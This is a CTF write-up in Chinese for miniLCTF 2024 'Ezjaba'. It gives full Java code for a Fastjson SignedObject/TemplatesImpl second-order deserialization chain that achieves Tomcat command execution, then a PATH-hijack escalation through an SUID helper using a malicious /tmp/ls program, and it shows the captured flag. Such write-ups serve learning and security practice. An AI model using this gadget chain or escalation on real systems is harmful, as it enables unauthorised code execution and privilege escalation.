# miniLCTF 2024 Ezjaba Writeup

## 题目简述

服务接收 Java 序列化数据。应用依赖允许构造 Fastjson 二次反序列化链：外层触发 `JSONObject.toString()`，其中的 `SignedObject.getObject()` 再反序列化内层 `TemplatesImpl`，最终在 Tomcat 中执行代码。应用进程是低权限 `ctf`，而 `/flag` 仅 `admin` 可读；还需利用带 admin SUID 的 `/list` 完成权限提升。

## 解题过程

### 构造二次反序列化链

对象调用关系为：

```text
ObjectInputStream.readObject
  -> EventListenerList / UndoManager
  -> JSONObject.toString
  -> SignedObject.getObject
  -> 第二次 ObjectInputStream.readObject
  -> TemplatesImpl 字节码加载
```

外层用 `EventListenerList` 和 `UndoManager.edits` 触发 `JSONObject.toString`；JSON 值放置一个合法签名的 `SignedObject`，其内部对象才是 `TemplatesImpl`。生成器的关键部分如下：

```java
TemplatesImpl templates = (TemplatesImpl)
    Gadgets.createTemplatesImpl("CLASS:TomcatCmdEcho");

KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject signed = new SignedObject(
    templates, kp.getPrivate(), Signature.getInstance("DSA"));

JSONObject json = new JSONObject();
json.put("foo", signed);

EventListenerList list = new EventListenerList();
UndoManager manager = new UndoManager();
Vector edits = (Vector) Reflections.getFieldValue(manager, "edits");
edits.add(json);
Reflections.setFieldValue(
    list, "listenerList", new Object[]{InternalError.class, manager});

ByteArrayOutputStream out = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(out);
oos.writeUTF("qn0ABX");
oos.writeObject(list);
System.out.println(Base64.getEncoder().encodeToString(out.toByteArray()));
```

把 Base64 结果作为 `data` 提交到 `/ser`，并在 `cmd` 请求头中放置要执行的命令。环境不出网，`TomcatCmdEcho` 或内存马比远程类加载更可靠。

### PATH 劫持 SUID helper

获得 `ctf` 命令执行后仍不能直接读 `/flag`。逆向根目录的 `/list` 可见它带 admin SUID，并调用：

```c
system("ls /var/www/html/uploads");
```

程序没有使用 `/bin/ls` 绝对路径，所以可以让 shell 在攻击者可写的 `/tmp` 中找到恶意 `ls`。题目删除了 `chmod`，但编译器生成的 ELF 默认可执行：

```c
// /tmp/ls.c
#include <stdlib.h>
int main(void) {
    return system("cat /flag");
}
```

```sh
gcc /tmp/ls.c -o /tmp/ls
export PATH=/tmp:$PATH
/list
```

`/list` 以 admin 身份解析 `ls`，从而执行 `/tmp/ls` 并读取：

```text
miniL{eZ_f0r_f4a4a4a4a4a4a4astjs0n_A_N_D_jaba}
```

## 方法总结

本题是两阶段链：Java 二次反序列化只取得低权限执行，SUID helper 的不安全 `system`/PATH 使用才跨越权限边界。分析 `SignedObject` 链时应区分外层触发器和内层真正危险对象；取得 RCE 后也必须核对 flag 权限，而不能把低权限 shell 当作终点。
